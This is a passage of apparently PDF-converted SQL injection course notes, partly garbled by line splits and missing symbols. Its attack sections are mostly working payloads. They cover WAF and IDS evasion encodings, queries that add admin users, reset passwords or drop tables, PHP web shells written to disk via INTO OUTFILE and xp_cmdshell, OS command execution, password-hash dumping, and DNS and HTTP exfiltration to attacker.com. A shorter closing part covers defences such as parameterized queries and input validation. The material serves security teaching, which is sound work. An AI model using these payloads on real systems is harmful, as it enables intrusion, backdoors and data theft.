> SELECT UTL_HTTP.REQUEST'http://attacker.com/' || SELECT user FROM
> 
> 
> #### 🔹 dual)) FROM dual
> 
> 
> 
> #### 🔹 Second-Order SQL Injection
> 
> 
> 
> #### 🔹 ⏰Second-Order SQL Injection
> 
> 
> Malicious SQL payload is stored in the database and executed later
> 
> 
> #### 🔹 when retrieved and used in another SQL query without proper
> 
> 
> sanitization.
> 
> 
> #### 🔹 Attack Flow:
> 
> 
> 
> #### 🔹  Inject malicious data into database
> 
> 
> 
> #### 🔹  Data is stored
> 
> 
> 
> #### 🔹  Application retrieves stored data
> 
> 
> 
> #### 🔹  Data used in new SQL query without sanitization
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 21 to 25 Syllabus Content**
>
> ### 📍 Page 21
>
> 
> #### 🔹  Injection executes
> 
> 
> 
> #### 🔹 Example:
> 
> 
> 
> #### 🔹  Registration: Store malicious username
> 
> 
> 
> #### 🔹 Username: admin'--
> 
> 
> 
> #### 🔹  Later, when profile is loaded:
> 
> 
> 
> #### 🔹 SELECT * FROM profiles WHERE username='admin'--'
> 
> 
> 
> #### 🔹 WAF Bypass Techniques
> 
> 
> 
> #### 🔹 JSONBased SQLi NoSQL
> 
> 
> 
> #### 🔹 {"username": {"$ne": null}}
> 
> 
> 
> #### 🔹 {"username": {"$gt": ""}}
> 
> 
> 
> #### 🔹 {"username": {"$regex": "^admin"}}
> 
> 
> 
> #### 🔹 Encoding:
> 
> 
> 
> #### 🔹 %27 OR %271%27%271 
> 
> 
> 
> #### 🔹 %55NION %53ELECT
> 
> 
> 
> #### 🔹 Case Variation:
> 
> 
> 
> #### 🔹 UnIoN SeLeCt
> 
> 
> 
> #### 🔹 Comments:
> 
> 
> 
> #### 🔹 UN/**/ION SE/**/LECT
> 
> 
> 
> #### 🔹 UNION/*comment*/SELECT
> 
> 
> 
> #### 🔹 Insert New User or Update Password
> 
> 
> 
> #### 🔹 Insert User:
> 
> 
> '; INSERT INTO users (username, password, role) VALUES 'attacker', 'hack
> 
> 
> #### 🔹 ed123', 'admin'); --
> 
>
> ---
>
> ### 📍 Page 22
>
> 
> #### 🔹 Update Password:
> 
> 
> '; UPDATE users SET password='hacked123' WHERE username='admin'; -- '; UPDATE users SET role='admin' WHERE username='attacker'; --
> 
> 
> #### 🔹 Delete Data:
> 
> 
> 
> #### 🔹 '; DELETE FROM users WHERE username='victim'; --
> 
> 
> 
> #### 🔹 '; DROP TABLE users; --
> 
> 
> 
> #### 🔹 4. Advanced SQL Injection
> 
> 
> 
> #### 🔹 4.1 Enumeration
> 
> 
> 
> #### 🔹 Database Enumeration:
> 
> 
> 
> #### 🔹 List Databases:
> 
> 
> 
> #### 🔹  MySQL
> 
> 
> 
> #### 🔹 SELECT schema_name FROM information_schema.schemata
> 
> 
> 
> #### 🔹 SHOW DATABASES
> 
> 
> 
> #### 🔹  MSSQL
> 
> 
> 
> #### 🔹 SELECT name FROM sys.databases
> 
> 
> 
> #### 🔹  Oracle
> 
> 
> 
> #### 🔹 SELECT DISTINCT owner FROM all_tables
> 
> 
> 
> #### 🔹  PostgreSQL
> 
> 
> 
> #### 🔹 SELECT datname FROM pg_database
> 
> 
> 
> #### 🔹 List Tables:
> 
> 
> 
> #### 🔹  MySQL/PostgreSQL/MSSQL
> 
> 
> SELECT table_name FROM information_schema.tables WHERE table_sche
> 
> 
> #### 🔹 ma='database_name'
> 
>
> ---
>
> ### 📍 Page 23
>
> 
> #### 🔹  Oracle
> 
> 
> 
> #### 🔹 SELECT table_name FROM all_tables WHERE owner='OWNER_NAME'
> 
> 
> 
> #### 🔹 List Columns:
> 
> 
> 
> #### 🔹  MySQL/PostgreSQL/MSSQL
> 
> 
> SELECT column_name FROM information_schema.columns WHERE table_n
> 
> 
> #### 🔹 ame='users'
> 
> 
> 
> #### 🔹  Oracle
> 
> 
> SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
> 
> 
> #### 🔹 Check Privileges:
> 
> 
> 
> #### 🔹  MySQL
> 
> 
> 
> #### 🔹 SELECT * FROM mysql.user
> 
> 
> SELECT user,host,Select_priv,Insert_priv,Update_priv,Delete_priv FROM my
> 
> 
> #### 🔹 sql.user
> 
> 
> 
> #### 🔹  MSSQL
> 
> 
> 
> #### 🔹 SELECT * FROM fn_my_permissions(NULL, 'DATABASE')
> 
> 
> 
> #### 🔹  PostgreSQL
> 
> 
> 
> #### 🔹 SELECT * FROM information_schema.table_privileges
> 
> 
> 
> #### 🔹 4.2 Advanced Enumeration
> 
> 
> 
> #### 🔹 Dump System Files:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 SELECT LOAD_FILE'/etc/passwd')
> 
> 
> SELECT LOAD_FILE'C\\Windows\\System32\\drivers\\etc\\hosts')
> 
> 
> #### 🔹 MSSQL
> 
> 
> SELECT * FROM OPENROWSETBULK 'C\\Windows\\System32\\drivers\\et
> 
> 
> #### 🔹 c\\hosts', SINGLE_CLOB AS x
> 
>
> ---
>
> ### 📍 Page 24
>
> 
> #### 🔹 Write Files:
> 
> 
> 
> #### 🔹  MySQL
> 
> 
> SELECT '?php system($_GET"cmd"]); ?' INTO OUTFILE '/var/www/htm
> 
> 
> #### 🔹 l/shell.php'
> 
> 
> 
> #### 🔹  MSSQL requires xp_cmdshell
> 
> 
> 
> #### 🔹 4.3 Creating Database Accounts
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 CREATE USER 'attacker'@'%' IDENTIFIED BY 'password123';
> 
> 
> 
> #### 🔹 GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%';
> 
> 
> 
> #### 🔹 FLUSH PRIVILEGES;
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 CREATE LOGIN attacker WITH PASSWORD  'password123';
> 
> 
> 
> #### 🔹 CREATE USER attacker FOR LOGIN attacker;
> 
> 
> 
> #### 🔹 EXEC sp_addsrvrolemember 'attacker', 'sysadmin';
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 CREATE USER attacker WITH PASSWORD 'password123';
> 
> 
> 
> #### 🔹 ALTER USER attacker WITH SUPERUSER;
> 
> 
> 
> #### 🔹 4.4 Password Grabbing
> 
> 
> 
> #### 🔹 Extract Password Hashes:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 SELECT user,authentication_string FROM mysql.user;
> 
> 
> 
> #### 🔹 SELECT user,password FROM mysql.user;  Older versions
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 2 4
> 
>
> ---
>
> ### 📍 Page 25
>
> 
> #### 🔹 SELECT name, password_hash FROM sys.sql_logins;
> 
> 
> 
> #### 🔹 SELECT name, password FROM sys.syslogins;  Older versions
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 SELECT usename, passwd FROM pg_shadow;
> 
> 
> 
> #### 🔹 Crack Hashes:
> 
> 
> 
> #### 🔹 Use John the Ripper
> 
> 
> 
> #### 🔹 Hashcat
> 
> 
> 
> #### 🔹 Online rainbow tables
> 
> 
> 
> #### 🔹 4.5 Exfiltrate Database
> 
> 
> 
> #### 🔹 Export Entire Database:
> 
> 
> 
> #### 🔹 SQLmap:
> 
> 
> 
> #### 🔹 sqlmap -u "http://target.com?id=1" --dump-all
> 
> 
> sqlmap -u "http://target.com?id=1" --dump D database_name T users
> 
> 
> #### 🔹 Manual Export:
> 
> 
> 
> #### 🔹  MySQL
> 
> 
> 
> #### 🔹 mysqldump -u root -p database_name > dump.sql
> 
> 
> 
> #### 🔹  Using SQL
> 
> 
> SELECT * FROM users INTO OUTFILE '/tmp/users.csv' FIELDS TERMINATE
> 
> 
> #### 🔹 D BY ',' ENCLOSED BY '"' LINES TERMINATED BY '\n';
> 
> 
> 
> #### 🔹 4.6 OS Interaction
> 
> 
> 
> #### 🔹 Execute Operating System Commands:
> 
> 
> 
> #### 🔹 MySQL UDF  User Defined Functions):
> 
> 
> 
> #### 🔹 SELECT sys_exec('whoami');
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 26 to 30 Syllabus Content**
>
> ### 📍 Page 26
>
> 
> #### 🔹 SELECT sys_eval('cat /etc/passwd');
> 
> 
> 
> #### 🔹 MSSQL (xp_cmdshell):
> 
> 
> 
> #### 🔹 EXEC xp_cmdshell 'whoami';
> 
> 
> 
> #### 🔹 EXEC xp_cmdshell 'ping attacker.com';
> 
> 
> 
> #### 🔹 Oracle:
> 
> 
> 
> #### 🔹  Requires Java permissions
> 
> 
> SELECT DBMS_JAVA.RUNJAVA'oracle/aurora/util/Wrapper c:\\windows\\sy
> 
> 
> #### 🔹 stem32\\cmd.exe /c dir' FROM dual;
> 
> 
> 
> #### 🔹 PostgreSQL
> 
> 
> 
> #### 🔹 COPY SELECT '' TO PROGRAM 'whoami';
> 
> 
> 
> #### 🔹 CREATE TABLE cmd_exec(cmd_output text);
> 
> 
> 
> #### 🔹 COPY cmd_exec FROM PROGRAM 'id';
> 
> 
> 
> #### 🔹 4.7 File System Interaction
> 
> 
> 
> #### 🔹 Read Files:
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> SELECT * FROM OPENROWSETBULK 'C\\Windows\\win.ini', SINGLE_CLO
> 
> 
> #### 🔹 B AS x;
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 SELECT LOAD_FILE'/etc/passwd');
> 
> 
> 
> #### 🔹 Write Files:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> SELECT '?php system($_GET"cmd"]); ?' INTO OUTFILE '/var/www/htm
> 
> 
> #### 🔹 l/shell.php';
> 
>
> ---
>
> ### 📍 Page 27
>
> 
> #### 🔹 4.8 Network Reconnaissance via SQLi
> 
> 
> 
> #### 🔹 Internal Network Scanning:
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹  Ping internal hosts
> 
> 
> 
> #### 🔹 EXEC master..xp_cmdshell 'ping 10.0.0.5'
> 
> 
> 
> #### 🔹 EXEC master..xp_cmdshell 'nslookup internal-server'
> 
> 
> 
> #### 🔹  Port scanning (slow)
> 
> 
> 
> #### 🔹 EXEC master..xp_cmdshell 'telnet 10.0.0.5 445'
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹  DNS resolution
> 
> 
> 
> #### 🔹 SELECT LOAD_FILE'\\\\\\\\internal-server\\\\abc')
> 
> 
> 
> #### 🔹 4.9 Bypass Admin Panel
> 
> 
> 
> #### 🔹 Locate Admin Interfaces:
> 
> 
> 
> #### 🔹 Common paths:
> 
> 
> 
> #### 🔹 /admin/
> 
> 
> 
> #### 🔹 /administrator/
> 
> 
> 
> #### 🔹 /admin.php
> 
> 
> 
> #### 🔹 /login.php
> 
> 
> 
> #### 🔹 /wp-admin/
> 
> 
> 
> #### 🔹 /phpmyadmin/
> 
> 
> 
> #### 🔹 /admin/login.php
> 
> 
> 
> #### 🔹 /backend/
> 
> 
> 
> #### 🔹 /cms/
> 
> 
> 
> #### 🔹 /manager/
> 
> 
> 
> #### 🔹 Brute Force:
> 
> 
> 
> #### 🔹 gobuster dir -u http://target.com -w admin-paths.txt
> 
> 
> 
> #### 🔹 ffuf -u http://target.com/FUZZ -w admin-paths.txt
> 
>
> ---
>
> ### 📍 Page 28
>
> 
> #### 🔹 4.10 PL/SQL Exploitation (Oracle)
> 
> 
> 
> #### 🔹 Oracle-Specific Attacks:
> 
> 
> 
> #### 🔹 Execute Jobs:
> 
> 
> 
> #### 🔹 BEGIN
> 
> 
> 
> #### 🔹 DBMS_SCHEDULER.CREATE_JOB 
> 
> 
> 
> #### 🔹 job_name ⇒ 'malicious_job',
> 
> 
> 
> #### 🔹 job_type ⇒ 'PLSQL_BLOCK',
> 
> 
> 
> #### 🔹 job_action ⇒ 'BEGIN execute_shell_command; END;',
> 
> 
> 
> #### 🔹 enabled  TRUE
> 
> 
> 
> #### 🔹 );
> 
> 
> 
> #### 🔹 END;
> 
> 
> 
> #### 🔹 Java Stored Procedures:
> 
> 
> 
> #### 🔹  Execute OS commands via Java
> 
> 
> SELECT DBMS_JAVA.RUNJAVA'oracle/aurora/util/Wrapper' FROM dual;
> 
> 
> #### 🔹 4.11 Create Server Backdoors via SQL Injection
> 
> 
> 
> #### 🔹 Web Shell Deployment:
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> SELECT '?php system($_GET"cmd"]); ?' INTO OUTFILE '/var/www/htm
> 
> 
> #### 🔹 l/shell.php';
> 
> 
> SELECT '?php eval($_POST"code"]); ?' INTO OUTFILE '/var/www/html/
> 
> 
> #### 🔹 backdoor.php';
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹  Using xp_cmdshell
> 
> 
> EXEC xp_cmdshell 'echo ^?php system($_GET"cmd"]); ?^>  C\\inetpub
> 
> 
> #### 🔹 \\wwwroot\\shell.php';
> 
> 
> 
> #### 🔹 Access Backdoor:
> 
>
> ---
>
> ### 📍 Page 29
>
> 
> #### 🔹 http://target.com/shell.php?cmd=whoami
> 
> 
> 
> #### 🔹 http://target.com/shell.php?cmd=cat /etc/passwd
> 
> 
> 
> #### 🔹 4.12 HTTP Header SQL Injection
> 
> 
> 
> #### 🔹 Inject via Headers:
> 
> 
> 
> #### 🔹 User-Agent:
> 
> 
> 
> #### 🔹 User-Agent: Mozilla/5.0' OR '1'='1' --
> 
> 
> 
> #### 🔹 Referer:
> 
> 
> 
> #### 🔹 Referer: http://attacker.com' OR '1'='1' --
> 
> 
> 
> #### 🔹 XForwarded-For:
> 
> 
> 
> #### 🔹 XForwarded-For: 192.168.1.1' OR '1'='1' --
> 
> 
> 
> #### 🔹 Cookie:
> 
> 
> 
> #### 🔹 Cookie: id=1' OR '1'='1' --
> 
> 
> 
> #### 🔹 Cookie: session=abc123'; DROP TABLE users; --
> 
> 
> 
> #### 🔹 4.13 DNS Exfiltration SQLi
> 
> 
> 
> #### 🔹 Data Extraction via DNS
> 
> 
> 
> #### 🔹 MySQL Windows):
> 
> 
> SELECT LOAD_FILECONCAT'\\\\\\\\', database(), '.attacker.com\\\\abc')); SELECT LOAD_FILECONCAT'\\\\\\\\', SELECT user()), '.attacker.com\\\\ab
> 
> 
> #### 🔹 c'));
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> '; DECLARE @data varchar(100); SET @data = SELECT DB_NAME; DECL ARE @query varchar(200); SET @query = '\\\\\\\\' + @data + '.attacker.com
>
> ---
>
> ### 📍 Page 30
>
> 
> #### 🔹 \\\\a'; EXEC master..xp_dirtree @query; --
> 
> 
> 
> #### 🔹 Monitor DNS
> 
> 
> 
> #### 🔹 # On attacker server
> 
> 
> 
> #### 🔹 tcpdump -i eth0 port 53
> 
> 
> 
> #### 🔹 python3 -m dnslib.server
> 
> 
> 
> #### 🔹 4.14 MongoDB Injection (NoSQL Injection)
> 
> 
> 
> #### 🔹 🗄NoSQL Injection
> 
> 
> Exploiting NoSQL databases like MongoDB, CouchDB, and Redis by
> 
> 
> #### 🔹 manipulating query operators and JSON payloads to bypass
> 
> 
> authentication or extract data.
> 
> 
> #### 🔹 MongoDB Injection Payloads:
> 
> 
> 
> #### 🔹 Authentication Bypass:
> 
> 
> 
> #### 🔹 {"username": {"$ne": null}, "password": {"$ne": null}}
> 
> 
> 
> #### 🔹 {"username": {"$gt": ""}, "password": {"$gt": ""}}
> 
> 
> 
> #### 🔹 {"username": "admin", "password": {"$regex": ".*"}}
> 
> 
> 
> #### 🔹 Data Extraction:
> 
> 
> 
> #### 🔹 {"username": {"$regex": "^admin"}}
> 
> 
> 
> #### 🔹 {"username": {"$where": "this.username == 'admin'"}}
> 
> 
> 
> #### 🔹 JavaScript Injection:
> 
> 
> {"username": "admin", "password": {"$where": "sleep(5000)"}}
> 
> 
> #### 🔹 Prevention:
> 
> 
> 
> #### 🔹 Use MongoDB query operators safely
> 
> 
> 
> #### 🔹 Validate input types
> 
> 
> 
> #### 🔹 Avoid $where operator
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 31 to 35 Syllabus Content**
>
> ### 📍 Page 31
>
> 
> #### 🔹 Use parameterized queries
> 
> 
> 
> #### 🔹 4.15 SQL Injection Tools
> 
> 
> 
> #### 🔹 Automated Tools:
> 
> 
> 
> #### 🔹 SQLmap
> 
> 
> 
> #### 🔹 # Basic scan
> 
> 
> 
> #### 🔹 sqlmap -u "http://target.com?id=1"
> 
> 
> 
> #### 🔹 # Dump database
> 
> 
> 
> #### 🔹 sqlmap -u "http://target.com?id=1" --dbs
> 
> 
> sqlmap -u "http://target.com?id=1" D database_name --tables sqlmap -u "http://target.com?id=1" D database_name T users --columns sqlmap -u "http://target.com?id=1" D database_name T users --dump
> 
> 
> #### 🔹 # POST request
> 
> 
> sqlmap -u "http://target.com/login" --data="username=admin&password=
> 
> 
> #### 🔹 pass"
> 
> 
> 
> #### 🔹 # OS shell
> 
> 
> 
> #### 🔹 sqlmap -u "http://target.com?id=1" --os-shell
> 
> 
> 
> #### 🔹 # Tamper scripts
> 
> 
> 
> #### 🔹 sqlmap -u "http://target.com?id=1" --tamper=space2comment
> 
> 
> 
> #### 🔹 Havij
> 
> 
> 
> #### 🔹 GUI-based tool
> 
> 
> 
> #### 🔹 Automated scanning
> 
> 
> 
> #### 🔹 Database dumping
> 
> 
> 
> #### 🔹 jSQL Injection
> 
> 
> 
> #### 🔹 Java-based
> 
> 
> 
> #### 🔹 Cross-platform
> 
> 
> 
> #### 🔹 Strategy selector
> 
> 
> 
> #### 🔹 BBQSQL
> 
>
> ---
>
> ### 📍 Page 32
>
> 
> #### 🔹 Blind SQL injection framework
> 
> 
> 
> #### 🔹 Python-based
> 
> 
> 
> #### 🔹 NoSQLMap
> 
> 
> 
> #### 🔹 NoSQL injection testing
> 
> 
> 
> #### 🔹 MongoDB focus
> 
> 
> 
> #### 🔹 Burp Suite
> 
> 
> 
> #### 🔹 Intruder module
> 
> 
> 
> #### 🔹 SQLi scanner
> 
> 
> 
> #### 🔹 Manual testing
> 
> 
> 
> #### 🔹 Nmap NSE
> 
> 
> 
> #### 🔹 nmap --script http-sql-injection target.com
> 
> 
> 
> #### 🔹 nmap --script mysql-injection target.com
> 
> 
> 
> #### 🔹 4.16 AI-Based SQL Injection
> 
> 
> 
> #### 🔹 AI Detection Capabilities:
> 
> 
> 
> #### 🔹 Pattern Recognition:
> 
> 
> 
> #### 🔹 Boolean logic patterns
> 
> 
> 
> #### 🔹 UNION sequence detection
> 
> 
> 
> #### 🔹 Time-delay anomalies
> 
> 
> 
> #### 🔹 Error message analysis
> 
> 
> 
> #### 🔹 Automated Fuzzing:
> 
> 
> 
> #### 🔹 Intelligent payload generation
> 
> 
> 
> #### 🔹 Context-aware testing
> 
> 
> 
> #### 🔹 Adaptive mutation
> 
> 
> 
> #### 🔹 Behavioral Analysis:
> 
> 
> 
> #### 🔹 Response time analysis
> 
> 
> 
> #### 🔹 Content length patterns
> 
>
> ---
>
> ### 📍 Page 33
>
> 
> #### 🔹 Error pattern recognition
> 
> 
> 
> #### 🔹 Exploit Generation:
> 
> 
> 
> #### 🔹 Custom payload creation
> 
> 
> 
> #### 🔹 Evasion technique suggestion
> 
> 
> 
> #### 🔹 Database-specific attacks
> 
> 
> 
> #### 🔹 5. Evasion Techniques
> 
> 
> 
> #### 🔹 5.1 IDS Evasion
> 
> 
> 
> #### 🔹 Signature Evasion Overview:
> 
> 
> 
> #### 🔹 Obfuscate payloads to avoid IDS/WAF detection:
> 
> 
> 
> #### 🔹 Modify syntax
> 
> 
> 
> #### 🔹 Use encoding
> 
> 
> 
> #### 🔹 Leverage whitespace
> 
> 
> 
> #### 🔹 Comment insertion
> 
> 
> 
> #### 🔹 5.2 Signature Evasion Techniques
> 
> 
> 
> #### 🔹 Inline Comments
> 
> 
> 
> #### 🔹 UN/**/ION SE/**/LECT
> 
> 
> 
> #### 🔹 SEL/*comment*/ECT
> 
> 
> 
> #### 🔹 UN/**/ION/**/SEL/**/ECT
> 
> 
> 
> #### 🔹 /*!UNION*/ /*!SELECT*/
> 
> 
> 
> #### 🔹 Character Encoding
> 
> 
> 
> #### 🔹 URL Encoding:
> 
> 
> 
> #### 🔹 %27 OR %271%27%271 
> 
> 
> 
> #### 🔹 %55NION %53ELECT
> 
> 
> 
> #### 🔹 Hex Encoding:
> 
>
> ---
>
> ### 📍 Page 34
>
> 
> #### 🔹 0x61646d696e -- 'admin' in hex
> 
> 
> 
> #### 🔹 SELECT 0x61646d696e
> 
> 
> 
> #### 🔹 EXEC0x73656c656374
> 
> 
> 
> #### 🔹 Unicode Encoding:
> 
> 
> 
> #### 🔹 %u0027 OR %u0031%u0031
> 
> 
> 
> #### 🔹 String Concatenation
> 
> 
> 
> #### 🔹 MySQL
> 
> 
> 
> #### 🔹 'ad'+'min'
> 
> 
> 
> #### 🔹 CONCAT'ad','min')
> 
> 
> 
> #### 🔹 'ad'||'min'
> 
> 
> 
> #### 🔹 MSSQL
> 
> 
> 
> #### 🔹 'ad'+'min'
> 
> 
> 
> #### 🔹 Oracle:
> 
> 
> 
> #### 🔹 'ad'||'min'
> 
> 
> 
> #### 🔹 Obfuscated Code
> 
> 
> 
> #### 🔹 Multi-Layer Encoding:
> 
> 
> 
> #### 🔹 %2527 OR %25271%2527%25271  (double URL encoding)
> 
> 
> 
> #### 🔹 Mixed Encoding:
> 
> 
> 
> #### 🔹 %27 OR 1%3D1 
> 
> 
> 
> #### 🔹 White Space Manipulation
> 
> 
> 
> #### 🔹 Use Alternative Whitespace:
> 
>
> ---
>
> ### 📍 Page 35
>
> 
> #### 🔹 UNION%09SELECT  Tab
> 
> 
> 
> #### 🔹 UNION%0ASELECT  Newline
> 
> 
> 
> #### 🔹 UNION%0DSELECT  Carriage return
> 
> 
> 
> #### 🔹 UNION%A0SELECT  Non-breaking space
> 
> 
> 
> #### 🔹 Hex Encoding
> 
> 
> 
> #### 🔹 SELECT 0x61646d696e -- admin
> 
> 
> 
> #### 🔹 WHERE username=0x61646d696e
> 
> 
> 
> #### 🔹 Sophisticated Pattern Matching
> 
> 
> 
> #### 🔹 Split Keywords:
> 
> 
> 
> #### 🔹 UN?IONSE?LECT
> 
> 
> 
> #### 🔹 UNI%00ON SEL%00ECT
> 
> 
> 
> #### 🔹 URL Encoding
> 
> 
> 
> #### 🔹 %20OR%2011
> 
> 
> 
> #### 🔹 %27%20OR%2011%20%20
> 
> 
> 
> #### 🔹 Null Byte
> 
> 
> 
> #### 🔹 SELECT%00username
> 
> 
> 
> #### 🔹 UNION%00SELECT
> 
> 
> 
> #### 🔹 Case Variation
> 
> 
> 
> #### 🔹 SeLeCt
> 
> 
> 
> #### 🔹 UnIoN sElEcT
> 
> 
> 
> #### 🔹 uNiOn AlL sElEcT
> 
> 
> 
> #### 🔹 Declare Variables
> 
> 
> 
> #### 🔹 MSSQL
> 
>
> ---
>

> [!NOTE]- 📄 **Pages 36 to 40 Syllabus Content**
>
> ### 📍 Page 36
>
> 
> #### 🔹 DECLARE @query VARCHAR100'SELECT * FROM users';
> 
> 
> 
> #### 🔹 EXEC(@query)
> 
> 
> 
> #### 🔹 DECLARE @a VARCHAR100'UNION SELECT';
> 
> 
> 
> #### 🔹 EXEC(@a)
> 
> 
> 
> #### 🔹 IP Fragmentation
> 
> 
> 
> #### 🔹 Fragment Payload:
> 
> 
> 
> #### 🔹 Split across multiple packets
> 
> 
> 
> #### 🔹 Bypass packet inspection
> 
> 
> 
> #### 🔹 IDS reconstruction issues
> 
> 
> 
> #### 🔹 Variations
> 
> 
> 
> #### 🔹 Randomized Payloads:
> 
> 
> 
> #### 🔹 ' OR 11 
> 
> 
> 
> #### 🔹 ' OR 22 
> 
> 
> 
> #### 🔹 ' OR 'a'='a' --
> 
> 
> 
> #### 🔹 ' OR 'x'='x' --
> 
> 
> 
> #### 🔹 6. SQL Injection Countermeasures
> 
> 
> 
> #### 🔹 6.1 How to Defend Against SQL Injection
> 
> 
> 
> #### 🔹 🛡Primary Defense: Parameterized Queries
> 
> 
> Use prepared statements with parameterized queries (also called bound parameters) to ensure user input is always treated as data, never as executable code.
> 
> 
> #### 🔹 Use Parameterized Queries (Prepared Statements)
> 
> 
> 
> #### 🔹 PHP PDO
> 
>
> ---
>
> ### 📍 Page 37
>
> 
> #### 🔹 $stmt  $pdo→prepare('SELECT * FROM users WHERE id  ?');
> 
> 
> 
> #### 🔹 $stmt→execute([$user_id]);
> 
> 
> 
> #### 🔹 // Named parameters
> 
> 
> $stmt  $pdo→prepare('SELECT * FROM users WHERE username = :usern
> 
> 
> #### 🔹 ame');
> 
> 
> 
> #### 🔹 $stmt→execute(['username'  $username]);
> 
> 
> 
> #### 🔹 PHP MySQLi):
> 
> 
> $stmt  $mysqli→prepare('SELECT * FROM users WHERE id  ?');
> 
> 
> #### 🔹 $stmt→bind_param('i', $user_id);
> 
> 
> 
> #### 🔹 $stmt→execute();
> 
> 
> 
> #### 🔹 ASP.NET
> 
> 
> SqlCommand cmd = new SqlCommand("SELECT * FROM users WHERE id
> 
> 
> #### 🔹 = @id", connection);
> 
> 
> 
> #### 🔹 cmd.Parameters.AddWithValue("@id", userId);
> 
> 
> 
> #### 🔹 Java JDBC
> 
> 
> PreparedStatement pstmt = connection.prepareStatement("SELECT * FRO
> 
> 
> #### 🔹 M users WHERE id  ?");
> 
> 
> 
> #### 🔹 pstmt.setInt(1, userId);
> 
> 
> 
> #### 🔹 ResultSet rs = pstmt.executeQuery();
> 
> 
> 
> #### 🔹 Python:
> 
> 
> cursor.execute("SELECT * FROM users WHERE id  ?", (user_id,)) cursor.execute("SELECT * FROM users WHERE id  %s", (user_id,))
> 
> 
> #### 🔹 Node.js:
> 
> 
> connection.query('SELECT * FROM users WHERE id  ?', [userId], function
> 
> 
> #### 🔹 (error, results) {
> 
>
> ---
>
> ### 📍 Page 38
>
> 
> #### 🔹 // Handle results
> 
> 
> 
> #### 🔹 });
> 
> 
> 
> #### 🔹 Use Stored Procedures (With Care)
> 
> 
> 
> #### 🔹 Parameterized Stored Procedure:
> 
> 
> 
> #### 🔹  Create stored procedure
> 
> 
> 
> #### 🔹 CREATE PROCEDURE GetUser(@id INT
> 
> 
> 
> #### 🔹 AS
> 
> 
> 
> #### 🔹 BEGIN
> 
> 
> 
> #### 🔹 SELECT * FROM users WHERE id = @id
> 
> 
> 
> #### 🔹 END
> 
> 
> 
> #### 🔹  Call from application
> 
> 
> 
> #### 🔹 EXEC GetUser @id  123
> 
> 
> Note: Stored procedures must also use parameterization internally
> 
> 
> #### 🔹 Use ORM with Strict Modes
> 
> 
> 
> #### 🔹 Django Python):
> 
> 
> 
> #### 🔹 User.objects.filter(id=user_id)  # Safe
> 
> 
> User.objects.raw("SELECT * FROM users WHERE id=%s", [user_id])  # Safe
> 
> 
> #### 🔹 with params
> 
> 
> 
> #### 🔹 Hibernate Java):
> 
> 
> Query query = session.createQuery("FROM User WHERE id = :id");
> 
> 
> #### 🔹 query.setParameter("id", userId);
> 
> 
> 
> #### 🔹 Entity Framework C#):
> 
> 
> var user = context.Users.Where(u ⇒ u.Id == userId).FirstOrDefault();
> 
> 
> #### 🔹 Escape Special Characters
> 
> 
> 
> #### 🔹 MySQL
> 
>
> ---
>
> ### 📍 Page 39
>
> $safe_input = mysqli_real_escape_string($conn, $user_input); Note: Escaping alone is not sufficient - use parameterization
> 
> 
> #### 🔹 Use Allowlists (Whitelisting)
> 
> 
> 
> #### 🔹 $allowed_columns = ['id', 'username', 'email'];
> 
> 
> 
> #### 🔹 if (in_array($column, $allowed_columns)) {
> 
> 
> 
> #### 🔹 $query = "SELECT $column FROM users";
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 $allowed_values = ['ASC', 'DESC'];
> 
> 
> 
> #### 🔹 if (in_array($order, $allowed_values)) {
> 
> 
> 
> #### 🔹 $query .= " ORDER BY id $order";
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 6.2 Application-Level Defenses
> 
> 
> 
> #### 🔹 Comprehensive Security Layers:
> 
> 
> 
> #### 🔹 Input Validation
> 
> 
> 
> #### 🔹 // Validate data types
> 
> 
> 
> #### 🔹 if !is_numeric($id)) {
> 
> 
> 
> #### 🔹 die("Invalid input");
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 // Validate format
> 
> 
> 
> #### 🔹 if !preg_match('/^[a-zAZ09_$/', $username)) {
> 
> 
> 
> #### 🔹 die("Invalid username");
> 
> 
> 
> #### 🔹 }
> 
> 
> 
> #### 🔹 // Length validation
> 
> 
> 
> #### 🔹 if (strlen($input)  100 
> 
> 
> 
> #### 🔹 die("Input too long");
> 
> 
> 
> #### 🔹 }
> 
>
> ---
>
> ### 📍 Page 40
>
> 
> #### 🔹 Strong Authentication
> 
> 
> 
> #### 🔹 Multi-factor authentication
> 
> 
> 
> #### 🔹 Strong password policies
> 
> 
> 
> #### 🔹 Account lockout mechanisms
> 
> 
> 
> #### 🔹 Session management best practices
> 
> 
> 
> #### 🔹 Sanitized Error Messages
> 
> 
> 
> #### 🔹 Bad:
> 
> 
> 
> #### 🔹 SQL Error: You have an error in your SQL syntax near ''
> 
> 
> 
> #### 🔹 Good:
> 
> 
> An error occurred. Please try again later.
> 
> 
> #### 🔹 Configuration:
> 
> 
> 
> #### 🔹 // PHP
> 
> 
> 
> #### 🔹 ini_set('display_errors', 0;
> 
> 
> 
> #### 🔹 error_reporting(0);
> 
> 
> 
> #### 🔹 // ASP.NET web.config
> 
> 
> 
> #### 🔹 <customErrors mode="On" />
> 
> 
> 
> #### 🔹 Server-Side Validation
> 
> 
> 
> #### 🔹 Never Trust Client-Side Validation:
> 
> 
> 
> #### 🔹 // Always validate on server
> 
> 
> 
